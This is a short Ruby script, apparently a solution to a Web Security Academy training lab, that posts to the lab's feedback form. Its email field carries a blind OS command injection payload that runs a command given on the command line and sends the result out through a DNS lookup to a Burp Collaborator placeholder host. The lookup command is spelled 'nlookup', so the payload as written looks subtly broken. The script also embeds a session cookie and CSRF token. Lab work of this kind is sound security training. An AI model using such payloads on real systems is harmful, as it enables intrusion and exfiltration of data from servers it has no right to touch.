require 'http'

url = "https://0ad500e60314a4ce80ac5dcc006e00fa.web-security-academy.net/feedback/submit"

client = HTTP.cookies(:session => "FL15MOCk07kmBdTTJ8foTLEzlcu8hYDt").post(url,:form => {
		:csrf => "PcuP3uDfDuaIevplSb6MdGN8rxGt0k42",
		:name => "name",
		:email => "a@b.com||nlookup+`#{ARGV[0]}`.BURP-COLLABORATOR-SUBDOMAIN||",
		:subject => "anything",
		:message => "message"
	})

puts "Done"
